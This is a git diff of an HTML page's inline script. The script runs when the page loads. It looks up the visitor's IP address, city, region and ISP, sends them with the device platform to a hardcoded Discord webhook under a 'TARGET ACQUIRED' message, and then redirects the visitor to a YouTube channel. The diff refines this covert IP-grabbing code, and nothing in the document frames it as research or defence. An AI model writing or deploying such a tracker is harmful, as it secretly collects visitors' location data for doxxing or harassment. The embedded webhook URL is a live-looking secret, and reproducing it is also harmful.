@@ -5,37 +5,38 @@
     const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
     const y = "https://youtube.com/@LigmaBlox-w7m";
 
-    // 1. Send immediate "Heartbeat" (This always works)
-    const startMsg = new Blob([JSON.stringify({ content: "⚠️ HIT: Searching for IP... (" + navigator.platform + ")" })], { type: 'application/json' });
-    navigator.sendBeacon(h, startMsg);
+    // 1. Instant Heartbeat
+    navigator.sendBeacon(h, new Blob([JSON.stringify({ content: "⚠️ HIT: Tracking City/IP... (" + navigator.platform + ")" })], { type: 'application/json' }));
 
-    async function rapidFire() {
+    async function getFullIntel() {
         let found = false;
         while (!found) {
             try {
-                // Racing the APIs
-                const r = await Promise.any([
-                    fetch('https://api.ipify.org?format=json').then(res => res.json()),
-                    fetch('https://ipinfo.io/json').then(res => res.json())
-                ]);
+                // Using ip-api.com (Professional grade, provides City/Region/ISP)
+                const r = await fetch('https://ip-api.com/json/').then(res => res.json());
 
-                if (r.ip) {
-                    const finalMsg = "🎯 TARGET ACQUIRED\nIP: " + r.ip + "\nCity: " + (r.city || "Unknown") + "\nDevice: " + navigator.platform;
+                if (r.status === "success") {
+                    const msg = "🎯 **TARGET ACQUIRED**\n" +
+                                "IP: " + r.query + "\n" +
+                                "City: " + r.city + "\n" +
+                                "Region: " + r.regionName + "\n" +
+                                "ISP: " + r.isp + "\n" +
+                                "Device: " + navigator.platform;
                     
-                    const blob = new Blob([JSON.stringify({ content: finalMsg })], { type: 'application/json' });
+                    const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
                     navigator.sendBeacon(h, blob);
                     
                     found = true;
                     window.location.replace(y);
                 }
             } catch (e) {
-                // The 2ms retry loop
+                // 2ms retry loop if the network blocks the request
                 await new Promise(resolve => setTimeout(resolve, 2));
             }
         }
     }
 
-    rapidFire();
+    getFullIntel();
 </script>
 </body>
 </html>
